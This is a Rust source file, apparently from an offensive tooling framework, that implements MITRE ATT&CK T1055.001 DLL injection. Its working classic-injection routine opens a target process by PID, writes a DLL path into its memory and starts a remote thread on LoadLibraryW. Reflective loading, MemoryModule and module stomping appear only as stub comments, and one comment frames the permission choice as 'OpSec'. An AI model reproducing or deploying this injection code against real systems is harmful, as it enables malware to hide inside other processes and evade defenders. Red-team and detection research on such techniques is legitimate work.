//! Implementation of MITRE ATT&CK T1055.001: Dynamic-link Library Injection.
//!
//! Provides modular capabilities to inject DLLs into remote processes.

use std::{
    mem::transmute,
    os::windows::{ffi::OsStrExt, raw::HANDLE},
    path::Path,
    ptr::{null, null_mut},
};

use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{MEM_COMMIT, PAGE_READWRITE, VirtualAllocEx},
            Threading::{
                CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
                PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            },
        },
    },
    core::PCSTR,
    w,
};

use crate::{
    error::InjectumError,
    info,
    payload::Payload,
    strategy::{Method, Strategy, Technique},
    target::Target,
};

/// The strategy implementation for T1055.001 (Dynamic-link Library Injection).
pub struct T1055_001;

/// Defines the supported sub-techniques for this strategy.
#[derive(Debug, PartialEq)]
enum InjectionMethod {
    ClassicDLLInjection,
    ReflectiveDLLInjection,
    MemoryModule,
    ModuleStomping,
}

impl TryFrom<Method> for InjectionMethod {
    type Error = InjectumError;

    fn try_from(method: Method) -> Result<Self, Self::Error> {
        match method.0 {
            "ClassicDLLInjection" => Ok(Self::ClassicDLLInjection),
            "ReflectiveDLLInjection" => Ok(Self::ReflectiveDLLInjection),
            "MemoryModule" => Ok(Self::MemoryModule),
            "ModuleStomping" => Ok(Self::ModuleStomping),
            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
        }
    }
}

impl Strategy for T1055_001 {
    fn requires_pid(&self, _method: Method) -> bool {
        true
    }

    fn execute(
        &self,
        payload: &Payload,
        target: &Target,
        method: Method,
    ) -> Result<(), InjectumError> {
        let info = Technique::T1055_001.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let variant: InjectionMethod = method.try_into()?;

        // 1. Validate Target (PID required)
        let pid = target
            .pid()
            .ok_or(InjectumError::PidRequired(info.mitre_id))?;

        // 2. Validate Payload (Must be DllFile with a valid path)
        let dll_path = match payload {
            Payload::DllFile { path: Some(p), .. } => p,
            _ => {
                return Err(InjectumError::PayloadMismatch {
                    strategy: info.mitre_id,
                    payload_type: "DllFile",
                });
            }
        };

        // 3. Execution based on variant
        match variant {
            InjectionMethod::ClassicDLLInjection => {
                info!("Method: Classic DLL Injection");
                inject_dll_classic(pid, dll_path)
            }
            _ => Err(InjectumError::MethodNotSupported(format!(
                "Method variant '{:?}' is not yet implemented.",
                method.0
            ))),
        }
    }
}

/// Wrapper to ensure handles are closed when they go out of scope.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// [Classic DLL Injection]
/// Performs classic DLL injection using `LoadLibraryW`.
fn inject_dll_classic(pid: u32, path: &Path) -> Result<(), InjectumError> {
    // 1. Prepare Path
    let wide_path = to_utf16_null_terminated(path);
    let size_in_bytes = wide_path.len() * size_of::<u16>();

    // 2. Open Target Process
    // We request only the specific permissions needed, rather than PROCESS_ALL_ACCESS which is better for OpSec and "Least Privilege".
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            pid,
        )
    };

    if process_handle.is_null() {
        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
            GetLastError()
        }));
    }

    let process_handle_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory in Target
    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle_guard.0,
            null(),
            size_in_bytes,
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
            GetLastError()
        }));
    }

    // 4. Write DLL Path to Target Memory
    let mut bytes_written: usize = 0;

    let write_success = unsafe {
        WriteProcessMemory(
            process_handle_guard.0,
            remote_buffer,
            wide_path.as_ptr().cast(),
            size_in_bytes,
            &mut bytes_written,
        )
    };

    if write_success == 0 || bytes_written != size_in_bytes {
        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Resolve LoadLibraryW Address
    let kernel32 = w!("kernel32.dll");

    let module_handle = unsafe { GetModuleHandleW(kernel32) };

    if module_handle.is_null() {
        return Err(InjectumError::Win32Error("GetModuleHandleW", unsafe {
            GetLastError()
        }));
    }

    let func_name = c"LoadLibraryW";

    let proc_address = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };

    if proc_address.is_none() {
        return Err(InjectumError::Win32Error("GetProcAddress", unsafe {
            GetLastError()
        }));
    }

    let start_routine: LPTHREAD_START_ROUTINE = unsafe { transmute(proc_address) };

    // 6. Create Remote Thread
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle_guard.0,
            null(),
            0,
            start_routine,
            remote_buffer,
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(InjectumError::Win32Error("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}

// [Reflective] Maps raw DLL bytes, finds ReflectiveLoader export, executes it.

// [MemoryModule] Manually maps PE sections, relocations, and imports.

// [ModuleStomping] Loads a decoy DLL and overwrites it.

/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}
